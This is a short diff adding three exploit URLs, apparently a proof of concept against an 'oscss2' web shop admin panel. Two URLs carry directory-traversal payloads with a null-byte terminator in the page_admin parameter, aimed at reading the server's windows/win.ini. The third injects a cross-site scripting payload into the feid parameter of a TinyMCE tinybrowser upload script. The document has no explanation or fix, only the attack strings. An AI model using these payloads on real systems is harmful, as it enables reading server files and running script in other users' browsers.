@@ -1,0 +1,5 @@
+http://www.example.com/oscss2/admin108/index.php?page_admin=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00
+ 
+http://www.example.com/oscss2/admin108/popup_image.php?page_admin=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00
+
+http://www.example.com/oscss2/admin108/editeur/tiny_mce/plugins/tinybrowser/upload.php?feid=%22);alert(0);//
